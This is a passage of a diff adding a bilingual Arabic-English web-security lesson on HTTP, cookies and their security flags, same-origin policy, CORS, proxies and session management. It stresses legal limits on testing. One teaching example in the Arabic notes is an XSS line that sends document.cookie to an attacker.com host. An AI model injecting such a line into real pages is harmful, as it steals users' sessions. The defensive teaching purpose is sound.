+<li>اكتب <code>headercheck.sh</code> — يأخذ عنوان URL، ويجلب ترويسات الاستجابة فقط بـ <code>curl -sI</code>، ويطبع تقريراً يعلّم على: غياب <code>Strict-Transport-Security</code>، وغياب <code>Content-Security-Policy</code>، وأي <code>Set-Cookie</code> <strong>يفتقد</strong> إلى <code>HttpOnly</code> أو <code>Secure</code> أو <code>SameSite</code>.</li>
+<li>أجب كتابةً: <em>الوسيط يقف بينك وبين السيرفر. ماذا يمكنه أن يرى، وماذا يمكنه أن يغيّر؟</em> ثم أجب عن الشق الأصعب: <em>أي من هذه التغييرات يتوقف عن العمل لحظة أن يصبح الاتصال HTTPS، ولماذا؟</em></li>
+</ul>
+<blockquote>
+<p><strong>قاعدة Natas:</strong> لا تبحث عن الحلول. إن علقت أكثر من 45 دقيقة، اكتب السؤال الذي تسأله بالضبط، خذ استراحة، ثم عُد. التلميح الواحد يكلّفك المستوى كاملاً.</p>
+</blockquote></div>
+  </div>
+</details><details class="lesson-sec" id="payoff" data-sec="payoff" open>
+  <summary class="lesson-sec-head">
+    <span class="lesson-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v6c0 4.5-3 7.6-7 9-4-1.4-7-4.5-7-9V6l7-3z"/></svg></span>
+    <span class="lesson-titles">
+      <h2><span class="only-en">Why this matters in security</span><span class="only-ar">لماذا يهم هذا أمنياً</span></h2>
+      <span class="lesson-sub"><span><span class="only-en">The security consequence</span><span class="only-ar">الأثر الأمني</span></span></span>
+    </span>
+    
+    <svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
+  </summary>
+  <div class="lesson-sec-body">
+    <div class="prose only-en"><p><strong>This week you learn that HTTP has no memory — and that almost every web security control exists to work around that fact.</strong></p>
+<p>Three things to internalize, and they are the spine of the next ten weeks:</p>
+<ol>
+<li>
+<p><strong>The cookie <em>is</em> the credential.</strong> When you log in, the server does not remember you. It hands you a random string and says "show me this and I'll believe you're you." Anyone who holds that string <strong>is</strong> you, for as long as it lives. This is <strong>session hijacking</strong>, and it is not an exotic exploit — it is the direct consequence of how sessions work. Steal the cookie, become the user. Which is why <code>HttpOnly</code> exists: it removes the cookie from JavaScript's reach, so that one injected line of script — an XSS — cannot simply read <code>document.cookie</code> and post it to an attacker's server. Flags are not decoration. Each one closes a specific, demonstrated attack.</p>
+</li>
+<li>
+<p><strong>The same-origin policy is the boundary that makes the browser safe to use.</strong> Without it, a page from any site could read the responses from your bank, your email, your admin panel — because your browser <em>is</em> authenticated to all of them. The origin is <code>scheme + host + port</code>: <code>http://bank.com</code> and <code>https://bank.com</code> are different origins, and so are <code>bank.com</code> and <code>bank.com:8080</code>. Learn the exact definition now; you will spend the rest of your career finding applications that enforce it in the browser but forget to enforce anything on the <strong>server</strong>. CORS is the controlled relaxation of that boundary — a way for one origin to say "yes, that other origin may read me." Misconfigured CORS (trusting any origin, or trusting one that reflects whatever you send) simply deletes the boundary.</p>
+</li>
+<li>
+<p><strong>Authentication and session management are two different systems, and confusing them is a real bug class.</strong> Authentication answers <em>"who are you?"</em> — once. Session management answers <em>"how do I know it's still you?"</em> — on every request afterwards. Applications that get authentication right and session management wrong are everywhere: they hash passwords properly, then issue a session ID that never changes after login (<strong>session fixation</strong>), or never expires, or is predictable. When a breach report says "authentication bypass," it very often means the second system failed, not the first.</p>
+</li>
+</ol>
+<p>And the honest lesson about the proxy: Burp Suite, DevTools, and <code>curl -v</code> are not "hacking tools." They are <strong>instruments for seeing what actually happens</strong>. Most people use a browser and have no idea a conversation took place. You now watch the conversation — and that change of perspective is the difference between a user and a security practitioner.</p>
+<blockquote>
+<p>⚠️ <strong>Legal boundary, stated plainly.</strong> Intercepting, modifying, or replaying HTTP traffic is only lawful against (a) systems you own, (b) your own lab VMs, or (c) platforms that explicitly authorize it — PortSwigger Academy, OverTheWire Natas, and CTFs. Pointing Burp at a website you do not own and do not have written permission to test is not "practice," it is unauthorized access, and it is a criminal offence in essentially every jurisdiction. There is no grey area here, and "I was just learning" is not a defence.</p>
+</blockquote></div>
+    <div class="prose only-ar" dir="rtl" lang="ar"><p><strong>تتعلّم هذا الأسبوع أن HTTP بلا ذاكرة — وأن كل ضابط أمني في الويب تقريباً موجود للالتفاف حول هذه الحقيقة.</strong></p>
+<p>ثلاثة أمور يجب أن تستوعبها جيداً، وهي العمود الفقري للأسابيع العشرة القادمة:</p>
+<ol>
+<li>
+<p><strong>الكوكي <em>هو</em> بيان الاعتماد.</strong> عند تسجيل الدخول، لا يتذكّرك السيرفر. بل يسلّمك نصاً عشوائياً ويقول "أرِني هذا وأصدّق أنك أنت". ومن يحمل هذا النص <strong>هو</strong> أنت، ما دام حياً. هذا هو <strong>اختطاف الجلسة</strong>، وليس استغلالاً غريباً — بل نتيجة مباشرة لطريقة عمل الجلسات. اسرق الكوكي، تصبح المستخدم. ولهذا يوجد <code>HttpOnly</code>: فهو يبعد الكوكي عن متناول الجافاسكربت، حتى لا يستطيع سطر سكربت محقون واحد — أي XSS — أن يقرأ <code>document.cookie</code> ويرسله ببساطة إلى سيرفر المهاجم. السمات ليست زينة. كل واحدة منها تُغلق هجوماً محدداً ومُبرهَناً عليه.</p>
+</li>
+<li>
+<p><strong>سياسة الأصل الواحد هي الحد الذي يجعل استخدام المتصفح آمناً.</strong> بدونها، تستطيع صفحة من أي موقع أن تقرأ استجابات بنكك وبريدك ولوحة تحكمك — لأن متصفحك <strong>مُصادَق</strong> على كل هذه المواقع. الأصل هو <code>scheme + host + port</code>: فـ <code>http://bank.com</code> و <code>https://bank.com</code> أصلان مختلفان، وكذلك <code>bank.com</code> و <code>bank.com:8080</code>. تعلّم التعريف الدقيق الآن؛ فستقضي بقية مسيرتك المهنية في إيجاد تطبيقات تطبّقه في المتصفح لكنها تنسى تطبيق أي شيء على <strong>السيرفر</strong>. أما CORS فهو الترخية المنظّمة لهذا الحد — طريقة يقول بها أصل ما "نعم، ذلك الأصل الآخر مسموح له بقراءتي". و CORS المُعدّ خطأً (الثقة بأي أصل، أو الثقة بأصل يكرّر ما ترسله) يمحو الحد بالكامل.</p>
+</li>
+<li>
+<p><strong>المصادقة وإدارة الجلسة نظامان مختلفان، والخلط بينهما فئة ثغرات حقيقية.</strong> المصادقة تجيب عن <em>"من أنت؟"</em> — مرة واحدة. وإدارة الجلسة تجيب عن <em>"كيف أعرف أنك ما زلت أنت؟"</em> — مع كل طلب بعد ذلك. والتطبيقات التي تُحسن الأولى وتُفسد الثانية في كل مكان: تُشفّر كلمات المرور بشكل صحيح، ثم تُصدر معرّف جلسة لا يتغير بعد تسجيل الدخول (<strong>Session Fixation</strong>)، أو لا ينتهي أبداً، أو يمكن تخمينه. وعندما يقول تقرير اختراق "تجاوز مصادقة"، ففي أغلب الحالات <strong>النظام الثاني هو الذي فشل</strong>، لا الأول.</p>
+</li>
+</ol>
+<p>والدرس الصادق عن الوسيط: Burp Suite و DevTools و <code>curl -v</code> ليست "أدوات اختراق". إنها <strong>أدوات لرؤية ما يحدث فعلاً</strong>. معظم الناس يستخدمون المتصفح ولا يعلمون أن محادثة جرت أصلاً. أنت الآن تراقب المحادثة — وهذا التغيير في المنظور هو الفرق بين مستخدم وممارس أمني.</p>
+<blockquote>
+<p>⚠️ <strong>الحد القانوني، بصراحة تامة.</strong> اعتراض حركة HTTP أو تعديلها أو إعادة تشغيلها لا يكون مشروعاً إلا ضد (أ) أنظمة تملكها، أو (ب) آلاتك الوهمية في مختبرك، أو (ج) منصات تُصرّح بذلك صراحةً — PortSwigger Academy و OverTheWire Natas و CTFs. توجيه Burp إلى موقع لا تملكه ولا تملك إذناً كتابياً باختباره ليس "تدريباً"، بل وصول غير مُصرَّح به، وهو جريمة جنائية في كل الأنظمة القانونية تقريباً. لا توجد منطقة رمادية هنا، و"كنت أتعلّم فقط" ليست دفاعاً.</p>
+</blockquote></div>
+  </div>
+</details><details class="lesson-sec" id="checkpoint" data-sec="checkpoint" open>
+  <summary class="lesson-sec-head">
+    <span class="lesson-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 22V4M4 4h12l-1.5 4L16 12H4"/></svg></span>
+    <span class="lesson-titles">
+      <h2><span class="only-en">Weekly Checkpoint</span><span class="only-ar">نقطة التحقّق الأسبوعية</span></h2>
+      <span class="lesson-sub"><span><span class="only-en">Prove it to yourself before moving on</span><span class="only-ar">أثبت لنفسك أنك أتقنت قبل المتابعة</span></span></span>
+    </span>
+    <button class="done-toggle" type="button" data-done aria-pressed="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg><span><span class="only-en">Mark complete</span><span class="only-ar">علّم كمكتمل</span></span></button>
+    <svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
+  </summary>
+  <div class="lesson-sec-body">
+    <div class="prose only-en"><ul>
+<li class="task">Draw the full request/response cycle from memory, including DNS, TCP, TLS, the request, and the response</li>
+<li class="task">Reproduce a browser request with <code>curl -v</code>, including the session cookie, and get the same content back</li>
+<li class="task">Given any status code, name its class and say what the class means</li>
+<li class="task">Explain <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite</code> in one sentence each, naming the attack each blocks</li>
+<li class="task">Show your Apache <code>access.log</code> entry for a request you made yourself, with every field explained</li>
+<li class="task">Intercept a request in Burp, modify it, forward it, and describe what changed on the page</li>
+<li class="task">Demonstrate the <code>HttpOnly</code> difference: value visible from JS without it, invisible with it</li>
+<li class="task">Natas levels 0–10 complete, with a note on how each was solved</li>
+</ul></div>
+    <div class="prose only-ar" dir="rtl" lang="ar"><ul>
+<li class="task">ارسم دورة الطلب/الاستجابة كاملة من الذاكرة، بما فيها DNS و TCP و TLS والطلب والاستجابة</li>
+<li class="task">أعد إنتاج طلب متصفح بـ <code>curl -v</code>، بما فيه كوكي الجلسة، واحصل على المحتوى نفسه</li>
+<li class="task">أعطِ أي رمز حالة: سمِّ فئته واذكر ما تعنيه الفئة</li>
+<li class="task">اشرح <code>HttpOnly</code> و <code>Secure</code> و <code>SameSite</code> في جملة واحدة لكل واحد، مع تسمية الهجوم الذي يمنعه</li>
+<li class="task">اعرض سطر <code>access.log</code> في Apache لطلب أرسلته بنفسك، مع شرح كل حقل</li>
+<li class="task">اعترض طلباً في Burp، وعدّله، ومرّره، وصِف ما الذي تغيّر في الصفحة</li>
+<li class="task">أثبت الفرق الذي تُحدثه <code>HttpOnly</code>: القيمة ظاهرة من JS بدونها، وغير ظاهرة معها</li>
+<li class="task">إكمال مستويات Natas 0–10، مع ملاحظة عن كيفية حل كل مستوى</li>
+</ul></div>
+  </div>
+</details><details class="lesson-sec only-ar" id="notes" data-sec="notes" open>
+  <summary class="lesson-sec-head">
+    <span class="lesson-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 21a9 9 0 1 0-9-9"/><path d="M12 7v5l3 2M3 21l3-3"/></svg></span>
+    <span class="lesson-titles">
+      <h2>ملاحظات مفاهيمية موسّعة</h2>
+      <span class="lesson-sub"><span>شرح إضافي موسّع</span></span>
+    </span>
+    <svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
+  </summary>
+  <div class="lesson-sec-body"><div class="prose" dir="rtl" lang="ar"><h3>دورة الطلب والاستجابة — ما يحدث فعلاً عندما تضغط Enter</h3>
+<p><strong>الويب كله يقوم على فكرة واحدة بسيطة:</strong> المتصفح يرسل <strong>طلباً (Request)</strong>، والسيرفر يرد بـ <strong>استجابة (Response)</strong>. ثم ينتهي كل شيء. لا علاقة دائمة، لا "اتصال مفتوح" بينهما.</p>
+<p><strong>الرحلة الكاملة:</strong></p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>#</th>
+<th>المرحلة</th>
+<th>ماذا يحدث</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>تحليل العنوان</td>
+<td>المتصفح يفكك <code>https://example.com/login</code> إلى بروتوكول + نطاق + مسار</td>
+</tr>
+<tr>
+<td>2</td>
+<td>استعلام DNS</td>
+<td>تحويل <code>example.com</code> إلى عنوان IP (تعلّمته في الأسبوع 5)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>اتصال TCP</td>
+<td>مصافحة ثلاثية على المنفذ 443</td>
+</tr>
+<tr>
+<td>4</td>
+<td>مصافحة TLS</td>
+<td>تشفير الاتصال وتوثيق شهادة السيرفر (الأسبوع 6)</td>
+</tr>
+<tr>
+<td>5</td>
+<td>إرسال الطلب</td>
+<td>المتصفح يكتب نصاً بصيغة HTTP ويرسله</td>
+</tr>
+<tr>
+<td>6</td>
+<td>معالجة السيرفر</td>
+<td>السيرفر يقرأ الطلب وينفّذ منطق التطبيق</td>
+</tr>
+<tr>
+<td>7</td>
+<td>الاستجابة</td>
+<td>السيرفر يعيد نصاً: حالة + ترويسات + جسم</td>
+</tr>
+<tr>
+<td>8</td>
+<td>العرض</td>
+<td>المتصفح يبني الصفحة وينفّذ الجافاسكربت</td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p><strong>النقطة الجوهرية:</strong> كل ما بين المرحلة 5 والمرحلة 7 هو <strong>نص عادي</strong> يمكنك قراءته وتعديله. لهذا يعمل <code>curl</code>، ولهذا يعمل Burp.</p>
+</blockquote>
+<p><strong>تشريح الطلب (Request):</strong></p>
+<div class="highlight"><pre><span></span><code><span class="err">GET /login HTTP/1.1              ← سطر الطلب: الطريقة + المسار + الإصدار</span>
+<span class="err">Host: example.com                ← أي موقع تريد (سيرفر واحد يخدم مواقع كثيرة)</span>
+<span class="err">User-Agent: Mozilla/5.0 ...      ← من أنت (المتصفح ونظامك)</span>
+<span class="err">Referer: https://example.com/    ← من أين أتيت (الصفحة السابقة)</span>
+<span class="err">Cookie: session=abc123          ← هويتك الحالية</span>
+<span class="err">Accept: text/html               ← ما نوع المحتوى الذي تفهمه</span>
+</code></pre></div>
+<p><strong>تشريح الاستجابة (Response):</strong></p>
+<div class="highlight"><pre><span></span><code><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK                  ← سطر الحالة</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html          ← نوع المحتوى القادم</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">4821             ← حجمه بالبايت</span>
+<span class="na">Set-Cookie</span><span class="o">:</span> <span class="l">session=abc123; HttpOnly; Secure; SameSite=Lax</span>
+                                 <span class="l">← &quot;احفظ هذا، وأرسله مع كل طلب قادم&quot;</span>
+
+&lt;!DOCTYPE html&gt; ...              ← الجسم (HTML أو JSON أو صورة)
+</code></pre></div>
+<h3>الطرق (Methods) ورموز الحالة (Status Codes)</h3>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>الطريقة</th>
+<th>المعنى</th>
+<th>ملاحظة أمنية</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>GET</code></td>
+<td>اطلب بيانات</td>
+<td><strong>يجب</strong> ألا تغيّر شيئاً — لكن كثير من المواقع تخالف ذلك</td>
+</tr>
+<tr>
+<td><code>POST</code></td>
+<td>أرسل بيانات جديدة</td>
+<td>يُستخدم للنماذج وتسجيل الدخول</td>
+</tr>
+<tr>
+<td><code>PUT</code></td>
+<td>استبدل مورداً بالكامل</td>
+<td>غالباً في الـ APIs</td>
+</tr>
+<tr>
+<td><code>DELETE</code></td>
+<td>احذف مورداً</td>
+<td>لو لم يُفحص التخويل هنا، فهذه كارثة</td>
+</tr>
+<tr>
+<td><code>HEAD</code></td>
+<td>مثل GET بدون جسم</td>
+<td>مفيد للفحص السريع</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>رموز الحالة — المهم هو الفئة، وليس الرقم:</strong></p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>الفئة</th>
+<th>المعنى</th>
+<th>أمثلة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1xx</code></td>
+<td>معلومة — الطلب قيد المعالجة</td>
+<td><code>100 Continue</code></td>
+</tr>
+<tr>
+<td><code>2xx</code></td>
+<td><strong>نجاح</strong></td>
+<td><code>200 OK</code> · <code>201 Created</code> · <code>204 No Content</code></td>
+</tr>
+<tr>
+<td><code>3xx</code></td>
+<td><strong>إعادة توجيه</strong></td>
+<td><code>301</code> دائم · <code>302</code> مؤقت · <code>304</code> لم يتغير (من الذاكرة المؤقتة)</td>
+</tr>
+<tr>
+<td><code>4xx</code></td>
+<td><strong>خطأ من العميل</strong> — أنت أخطأت</td>
+<td><code>401</code> لم تُصادق · <code>403</code> مصادق لكن <strong>ممنوع</strong> · <code>404</code> غير موجود</td>
+</tr>
+<tr>
+<td><code>5xx</code></td>
+<td><strong>خطأ من السيرفر</strong></td>
+<td><code>500</code> خطأ داخلي · <code>503</code> الخدمة غير متاحة</td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p><strong>تمييز يجب أن يعلق في ذهنك:</strong> <code>401</code> تعني "<strong>من أنت؟</strong> سجّل الدخول أولاً". <code>403</code> تعني "<strong>أعرف من أنت، ولن أسمح لك</strong>". الخلط بينهما في الكود يعني غالباً أن التحقق من الصلاحيات غائب — وهذا موضوع الأسبوع القادم بالكامل.</p>
+</blockquote>
+<h3>لماذا HTTP بلا ذاكرة (Stateless)؟ وكيف تُحل المشكلة؟</h3>
+<p><strong>HTTP لا يتذكر شيئاً.</strong> كل طلب مستقل تماماً. السيرفر لا يعرف أن الطلب الثاني جاء من نفس الشخص الذي أرسل الأول. <strong>هذه ليست عيباً</strong> — بل هي سبب قابلية الويب للتوسع: أي سيرفر في المزرعة يستطيع خدمة أي طلب.</p>
+<p><strong>لكن المشكلة:</strong> كيف يبقى تسجيل الدخول فعالاً إن كان كل طلب "غريباً"؟</p>
+<p><strong>الحل على ثلاث طبقات:</strong></p>
+<p><strong>1. الكوكي (Cookie) — ذاكرة في جهازك أنت</strong></p>
+<p>السيرفر يرسل في أول استجابة <code>Set-Cookie: session=abc123</code>. المتصفح يحفظها، ويرسلها تلقائياً في ترويسة <code>Cookie</code> مع <strong>كل</strong> طلب لاحق لذلك النطاق.</p>
+<div class="highlight"><pre><span></span><code><span class="err">الطلب الأول:   POST /login   (اسم المستخدم وكلمة المرور)</span>
+<span class="err">الاستجابة:      Set-Cookie: session=abc123</span>
+<span class="err">الطلب التالي:  GET /dashboard</span>
+<span class="err">               Cookie: session=abc123      ← المتصفح أضافها تلقائياً</span>
+</code></pre></div>
+<p><strong>2. الجلسة (Session) — ذاكرة على السيرفر.</strong> السيرفر يحتفظ بجدول: <code>abc123</code> ← المستخدم "ali"، مسجّل الدخول، صلاحياته كذا. الكوكي تحتوي <strong>معرّفاً فقط</strong>، وليس البيانات نفسها.</p>
+<p><strong>3. البديل: الرمز (Token).</strong> بدلاً من تخزين الجلسة على السيرفر، يُرسل رمز موقّع يحتوي البيانات نفسها (JWT مثلاً). لا يحتاج السيرفر لتخزين شيء، لكن لا يستطيع إبطاله فوراً.</p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>المقارنة</th>
+<th>الجلسة (Session)</th>
+<th>الرمز (Token / JWT)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>أين تُخزَّن الحالة</td>
+<td>على السيرفر</td>
+<td>داخل الرمز نفسه</td>
+</tr>
+<tr>
+<td>إبطال فوري</td>
+<td>ممكن (احذف السجل)</td>
+<td>صعب جداً</td>
+</tr>
+<tr>
+<td>قابلية التوسع</td>
+<td>تحتاج مخزناً مشتركاً</td>
+<td>ممتازة (لا حالة)</td>
+</tr>
+<tr>
+<td>المخزون في المتصفح</td>
+<td>كوكي</td>
+<td>كوكي أو ذاكرة JS</td>
+</tr>
+</tbody>
+</table></div>
+<h3>الكوكيز وسمات الأمان — قلب أمان الويب</h3>
+<p><strong>الكوكي مجرد نص، لكنه يُرسل تلقائياً — وهذا ما يجعله خطيراً.</strong> لأن المتصفح يرسله دون سؤالك، فأي شخص يملك قيمة الكوكي <strong>يصبح أنت</strong>.</p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>السمة</th>
+<th>ماذا تفعل</th>
+<th>الهجوم الذي تمنعه</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>HttpOnly</code></td>
+<td>تمنع <strong>الجافاسكربت</strong> من قراءة الكوكي</td>
+<td>سرقة الكوكي عبر <strong>XSS</strong></td>
+</tr>
+<tr>
+<td><code>Secure</code></td>
+<td>ترسلها فقط عبر HTTPS</td>
+<td>اعتراضها على شبكة غير مشفرة</td>
+</tr>
+<tr>
+<td><code>SameSite=Strict/Lax</code></td>
+<td>لا تُرسل الكوكي مع الطلبات القادمة من موقع آخر</td>
+<td><strong>CSRF</strong> (تزوير الطلب عبر المواقع)</td>
+</tr>
+<tr>
+<td><code>Path</code></td>
+<td>تحدد نطاق المسارات</td>
+<td>تقليل الانتشار</td>
+</tr>
+<tr>
+<td><code>Expires</code> / <code>Max-Age</code></td>
+<td>مدة الصلاحية</td>
+<td>تقليل نافذة الاستغلال</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>مثال من الواقع — لماذا <code>HttpOnly</code> ضرورية؟</strong></p>
+<p>تخيّل أن الموقع فيه ثغرة XSS تسمح بحقن سطر جافاسكربت:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// لو لم تكن HttpOnly موجودة:</span>
+<span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;https://attacker.com/steal?c=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
+</code></pre></div>
+<p>هذا السطر يرسل كوكي جلستك إلى سيرفر المهاجم في أجزاء من الثانية. <strong>بمجرد وصول الكوكي إلى المهاجم، يصبح هو أنت</strong> — دون أن يعرف كلمة مرورك أصلاً.</p>
+<blockquote>
+<p><strong><code>HttpOnly</code> لا تمنع الجافاسكربت من <em>التصرف</em> بصلاحياتك</strong> (يمكنه إرسال طلبات باسمك)، لكنها تمنعه من <strong>قراءة</strong> الكوكي وسرقتها لاستخدامها لاحقاً ومن أي جهاز. هذا فرق دقيق ومهم.</p>
+</blockquote>
+<h3>سياسة الأصل الواحد (Same-Origin Policy) — الحدود التي تجعل التصفح آمناً</h3>
+<p><strong>الأصل (Origin)</strong> = البروتوكول + النطاق + المنفذ. يجب أن تتطابق الثلاثة.</p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>العنوان أ</th>
+<th>العنوان ب</th>
+<th>نفس الأصل؟</th>
+<th>السبب</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>https://bank.com/a</code></td>
+<td><code>https://bank.com/b</code></td>
+<td>✅ نعم</td>
+<td>نفس البروتوكول والنطاق والمنفذ</td>
+</tr>
+<tr>
+<td><code>http://bank.com</code></td>
+<td><code>https://bank.com</code></td>
+<td>❌ لا</td>
+<td>البروتوكول مختلف</td>
+</tr>
+<tr>
+<td><code>https://bank.com</code></td>
+<td><code>https://mail.bank.com</code></td>
+<td>❌ لا</td>
+<td>النطاق الفرعي مختلف</td>
+</tr>
+<tr>
+<td><code>https://bank.com</code></td>
+<td><code>https://bank.com:8080</code></td>
+<td>❌ لا</td>
+<td>المنفذ مختلف</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>ماذا تحمي؟</strong> تمنع صفحة من موقع "أ" من قراءة محتوى الاستجابات من موقع "ب". بدونها، أي صفحة تفتحها تستطيع قراءة بريدك وبنكك — لأن متصفحك <strong>مُصادَق</strong> على كل هذه المواقع بالكوكيز.</p>
+<blockquote>
+<p><strong>الخطأ الشائع والخطير:</strong> أن يعتمد المطوّر على سياسة الأصل الواحد للحماية ويقول "المتصفح يمنع ذلك". سياسة الأصل الواحد قيد <strong>على المتصفح</strong>، وليست قيداً على السيرفر. المهاجم لا يستخدم متصفحاً — يستخدم <code>curl</code> أو Burp. <strong>كل تحقق من الصلاحيات يجب أن يكون على السيرفر.</strong> هذه الجملة هي أهم جملة في هذين الأسبوعين.</p>
+</blockquote>
+<p><strong>CORS</strong> هو الاستثناء المنظّم: السيرفر يقول صراحة "أنا أثق بهذا الأصل الآخر واسمح له بالقراءة". إن كان الإعداد "أثق بأي أصل" أو "أكرّر الأصل الذي يرسله الطلب"، فقد حذفت الحدود بالكامل.</p>
+<h3>الوسيط (Proxy) — ترى كل شيء وتغيّر كل شيء</h3>
+<p><strong>الوسيط</strong> برنامج يقف في المنتصف: متصفحك يرسل إليه، وهو يمرّر للسيرفر، ثم يعيد الاستجابة إليك.</p>
+<p><strong>ماذا يرى؟</strong> كل شيء: المسار، الطريقة، كل ترويسة، كل كوكي، كل جسم الطلب والاستجابة.</p>
+<p><strong>ماذا يستطيع أن يغيّر؟</strong> كل شيء أيضاً — هذا هو المنطق الذي تقوم عليه ثغرات الويب: لأن المدخلات تُعدَّل بسهولة، فإن أي تطبيق <strong>يثق</strong> بمدخلات المستخدم سيُخدع.</p>
+<p><strong>الاستثناء الوحيد:</strong> إن كان الاتصال HTTPS <strong>و</strong> تثبيت الشهادات مفعّلاً (certificate pinning)، يفشل الوسيط. هذا فرق جوهري بين Burp في يدك على جهازك، وبين مهاجم على الشبكة.</p>
+<blockquote>
+<p><strong>في تطبيقك العملي:</strong> Burp Suite و DevTools هما نفس الفكرة — نافذة على الحقيقة. الفرق أن Burp يسمح بتعديل الطلب <strong>قبل</strong> وصوله، وبتكراره مئات المرات.</p>
+</blockquote>
+<h3>المصادقة مقابل إدارة الجلسة — الخلط الذي يوقع الأنظمة</h3>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>السؤال</th>
+<th>النظام المسؤول</th>
+<th>متى يُنفَّذ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>من أنت؟</strong></td>
+<td>المصادقة (Authentication)</td>
+<td><strong>مرة واحدة</strong> عند تسجيل الدخول</td>
+</tr>
+<tr>
+<td><strong>هل ما زلت أنت؟</strong></td>
+<td>إدارة الجلسة (Session Management)</td>
+<td><strong>مع كل طلب</strong></td>
+</tr>
+<tr>
+<td><strong>هل يُسمح لك بهذا؟</strong></td>
+<td>التخويل (Authorization)</td>
+<td><strong>مع كل طلب حساس</strong></td>
+</tr>
+</tbody>
+</table></div>
+<p>الكثير من الأنظمة تُحسن الأول وتُفسد الثاني: تُشفّر كلمات المرور بشكل صحيح، ثم تُصدر معرّف جلسة لا يتغير بعد تسجيل الدخول (<strong>Session Fixation</strong>)، أو لا ينتهي أبداً، أو يمكن تخمينه. عندما تقرأ تقرير اختراق يقول "تجاوز المصادقة"، ففي أغلب الحالات <strong>النظام الثاني هو الذي فشل</strong>.</p></div></div>
+</details><details class="lesson-sec" id="terms" data-sec="terms" open>
+  <summary class="lesson-sec-head">
+    <span class="lesson-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20.6 13.4 12 22l-9-9V4h9z"/><circle cx="7.5" cy="7.5" r="1.2"/></svg></span>
+    <span class="lesson-titles">
+      <h2><span class="only-en">Terms of the Week</span><span class="only-ar">مصطلحات الأسبوع</span></h2>
+      <span class="lesson-sub"><span><span class="only-en">Keep these in English</span><span class="only-ar">احتفظ بها بالإنجليزية</span></span></span>
+    </span>
+    <svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
+  </summary>
+  <div class="lesson-sec-body"><div class="prose"><div class="tablewrap"><table>
+<thead>
+<tr>
+<th>English</th>
+<th>العربية</th>
+<th>ملاحظة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Request / Response</td>
+<td>الطلب / الاستجابة</td>
+<td>الوحدة الأساسية للويب</td>
+</tr>
+<tr>
+<td>HTTP Header</td>
+<td>ترويسة</td>
+<td>بيانات وصفية تُرفق بالطلب أو الاستجابة</td>
+</tr>
+<tr>
+<td>Method</td>
+<td>الطريقة</td>
+<td><code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>DELETE</code></td>
+</tr>
+<tr>
+<td>Status Code</td>
+<td>رمز الحالة</td>
+<td>رقم من 3 خانات، المهم فئته</td>
+</tr>
+<tr>
+<td>Stateless</td>
+<td>بلا حالة</td>
+<td>السيرفر لا يتذكر الطلبات السابقة</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>الكوكي</td>
+<td>بيانات صغيرة يحفظها المتصفح ويرسلها تلقائياً</td>
+</tr>
+<tr>
+<td><code>Set-Cookie</code></td>
+<td>تعيين كوكي</td>
+<td>ترويسة الاستجابة التي تُنشئ الكوكي</td>
+</tr>
+<tr>
+<td>Session</td>
+<td>الجلسة</td>
+<td>حالة مخزّنة على السيرفر مرتبطة بمعرّف</td>
+</tr>
+<tr>
+<td>Session Hijacking</td>
+<td>اختطاف الجلسة</td>
+<td>سرقة معرّف الجلسة لانتحال هوية الضحية</td>
+</tr>
+<tr>
+<td>HttpOnly</td>
+<td>—</td>
